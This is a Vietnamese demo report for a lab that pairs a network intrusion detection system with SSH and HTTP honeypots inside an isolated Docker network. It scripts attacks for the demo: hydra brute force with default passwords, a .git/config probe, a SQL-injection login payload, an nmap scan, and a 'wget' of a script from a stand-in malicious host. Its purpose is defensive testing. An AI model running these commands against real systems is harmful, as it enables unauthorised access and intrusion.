# Báo cáo demo: Hybrid NIDS kết hợp Honeypot

Demo tấn công thủ công bằng các công cụ thật (curl, hydra, ssh, nmap), không dùng `attacker/attack_demo.py`. Các cột "Kết quả thực tế" để trống, điền sau khi chạy.

## 1. Mục tiêu

Chứng minh hai điều:

1. Honeypot ghi lại hành vi tấn công (đăng nhập SSH, lệnh, login web, SQLi) vào cùng CSDL với NIDS.
2. Honeypot làm giàu cảnh báo: cảnh báo của rule engine từ một IP đã chạm honeypot được nâng một bậc priority và gắn nhãn `[honeypot-confirmed]`.

## 2. Mô hình triển khai

Mạng Docker cô lập `172.28.0.0/16`.

| Thành phần | Container | Địa chỉ / cổng | Vai trò |
|---|---|---|---|
| Victim | `nids_victim` | `172.28.0.50` (nginx :80, sshd :22) | Nạn nhân thật |
| Honeypot SSH | `nids_honeypot_ssh` | `172.28.0.50:2222` | Bẫy SSH, nhận mọi mật khẩu, shell giả |
| Honeypot HTTP | `nids_honeypot_http` | `172.28.0.50:8080` | Bẫy trang login WordPress giả |
| NIDS engine | `nids_engine` | chung network với victim | Sniff toàn bộ traffic, đối chiếu rule |
| MySQL | `nids_mysql` | `172.28.0.10:3306` | Bảng `events` dùng chung |
| API + dashboard | `nids_api` | `172.28.0.20`, http://localhost:8000/ | Hiển thị cảnh báo |
| Attacker (Kali) | `nids_attacker` | `172.28.0.100` | Máy tấn công |

Honeypot chạy chung network với victim nên NIDS thấy cả traffic tới honeypot: một đòn có thể vừa sinh sự kiện honeypot vừa sinh cảnh báo rule.

## 3. Chuẩn bị

```bash
cd App
docker compose up --build -d          # đợi khoảng 30 giây cho MySQL sẵn sàng
docker logs nids_engine               # phải có dòng nạp rule và "Lắng nghe trực tiếp"
docker logs nids_honeypot_ssh         # phải có "SSH honeypot đang lắng nghe"
```

Mở http://localhost:8000/, bấm **Xoá dữ liệu**. Mở sẵn hai terminal: `docker logs -f nids_engine` và một terminal để vào attacker:

```bash
docker exec -it nids_attacker bash
```

Mọi lệnh tấn công dưới đây chạy trong shell của attacker.

## 4. Kịch bản

### Bước 1. Lưu lượng bình thường (đối chứng)

```bash
curl -s -o /dev/null -w "%{http_code}\n" http://172.28.0.50/
```

| Kỳ vọng | Kết quả thực tế |
|---|---|
| In `200`; dashboard vẫn 0 cảnh báo, 0 sự kiện honeypot | |

### Bước 2. NIDS bắt tấn công web (chưa có honeypot)

```bash
curl -s -o /dev/null "http://172.28.0.50/.git/config"
```

Request này vào nginx của victim, khớp rule SID 1000043 (lộ thư mục `.git`, priority P2).

| Kỳ vọng | Kết quả thực tế |
|---|---|
| Dashboard có 1 cảnh báo nguồn **NIDS**, SID 1000043, **P2**, không có nhãn `[honeypot-confirmed]` | |

### Bước 3. Tấn công honeypot SSH

Brute force bằng hydra:

```bash
hydra -l root -p 123456 -t 4 -s 2222 ssh://172.28.0.50
hydra -l admin -p admin -t 4 -s 2222 ssh://172.28.0.50
```

Đăng nhập tương tác và gõ lệnh trinh sát (mật khẩu nhập gì cũng được):

```bash
ssh -p 2222 -o StrictHostKeyChecking=no root@172.28.0.50
# trong shell giả:
whoami
pwd
ls
cat jumpbox1.conf
wget http://evil.example/a.sh
exit
```

Lệnh một lần (exec):

```bash
ssh -p 2222 -o StrictHostKeyChecking=no root@172.28.0.50 'uname -a'
```

| Kỳ vọng | Kết quả thực tế |
|---|---|
| Nhiều sự kiện `ssh.auth.attempt` (P3), mỗi lệnh gõ là một `ssh.command` (P2), lệnh exec là `ssh.exec` (P2); nguồn **Honeypot**, `dst_port` 2222, `src_ip` `172.28.0.100` | |
| Bảng "Top IP tấn công" xuất hiện `172.28.0.100` với số sự kiện honeypot > 0 | |
| `docker logs nids_honeypot_ssh` in từng lần đăng nhập và từng lệnh | |

### Bước 4. Tấn công honeypot HTTP

```bash
# login sai mật khẩu
curl -s -d "username=admin&password=wrong" http://172.28.0.50:8080/wp-admin-login
# login kèm SQL injection
curl -s -A "sqlmap/1.8" -d "username=admin' or 1=1--&password=x" http://172.28.0.50:8080/wp-admin-login
```

| Kỳ vọng | Kết quả thực tế |
|---|---|
| Hai sự kiện `http.login` nguồn **Honeypot**: lần sai mật khẩu là P2, lần có SQLi là **P1**; `http_method` POST, `http_uri` `/wp-admin-login` | |

### Bước 5. Làm giàu cảnh báo (điểm chính của hệ thống kết hợp)

Lặp lại đúng đòn ở bước 2, bây giờ IP `172.28.0.100` đã chạm honeypot:

```bash
curl -s -o /dev/null "http://172.28.0.50/.git/config"
```

| Kỳ vọng | Kết quả thực tế |
|---|---|
| Cảnh báo SID 1000043 mới có **P1** (nâng từ P2) và summary có `[honeypot-confirmed]`; cảnh báo ở bước 2 vẫn là P2 để đối chiếu | |
| Terminal `nids_engine` in dòng cảnh báo `[P1] SID 1000043 ... [honeypot-confirmed]` màu đỏ | |

Lưu ý: danh sách IP honeypot được engine làm mới mỗi 5 giây; nếu chạy ngay sau bước 3 hoặc 4 mà chưa thấy nhãn, đợi vài giây rồi gửi lại.

### Bước 6. Quét mạng (tuỳ chọn)

```bash
nmap -sV -p 22,80,2222,8080 172.28.0.50
```

| Kỳ vọng | Kết quả thực tế |
|---|---|
| Nmap thấy các cổng; NIDS có thể bắn cảnh báo quét; các IP nguồn đều là `172.28.0.100` | |

## 5. Kiểm tra bằng API

```bash
curl -s "http://localhost:8000/api/alerts/?source_type=HONEYPOT&limit=5"
curl -s "http://localhost:8000/api/alerts/?source_type=RULE_ENGINE&limit=5"
curl -s "http://localhost:8000/api/alerts/attackers"
```

`/api/alerts/attackers` trả về, cho mỗi IP: `honeypot_events`, `nids_alerts`, `first_seen`, `last_seen`.

## 6. Kết quả tổng hợp (điền sau khi chạy)

| Chỉ số | Giá trị |
|---|---|
| Số sự kiện Honeypot ghi được | |
| Số cảnh báo NIDS | |
| Số cảnh báo được nâng priority (`[honeypot-confirmed]`) | |
| IP attacker được nhận diện | |

## 7. Nhận xét và giới hạn

- Honeypot giúp xác nhận ý đồ: không người dùng hợp lệ nào kết nối tới 2222/8080, nên IP chạm vào đó đáng tin là attacker; NIDS dùng thông tin này để tăng priority.
- Cảnh báo đầu tiên từ một IP, trước khi IP đó chạm honeypot, không được nâng (như bước 2).
- Honeypot SSH/HTTP còn đơn giản: shell giả chỉ có vài lệnh, chưa có session theo kết nối, chưa ghi mọi request HTTP, chưa chặn tài nguyên.
- Chưa có chuyển hướng traffic đáng ngờ từ NIDS sang honeypot.

## 8. Dọn dẹp sau demo

```bash
docker compose down        # thêm -v nếu muốn xoá cả dữ liệu MySQL
```
